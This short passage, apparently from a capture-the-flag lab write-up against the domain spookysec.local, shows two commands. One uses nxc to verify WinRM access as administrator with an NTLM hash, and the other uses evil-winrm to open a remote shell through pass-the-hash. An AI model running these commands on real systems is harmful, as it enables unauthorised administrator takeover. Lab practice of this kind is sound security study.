Verified Remote Management access

```bash
nxc winrm 10.10.208.7 -u administrator -H "aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc" -d spookysec.local
```
![[Pasted image 20240812102533.png]]

```bash
evil-winrm -i 10.10.208.7 -u 'administrator' -H "0e0363213e37b94221497260b0bcb4fc"
```
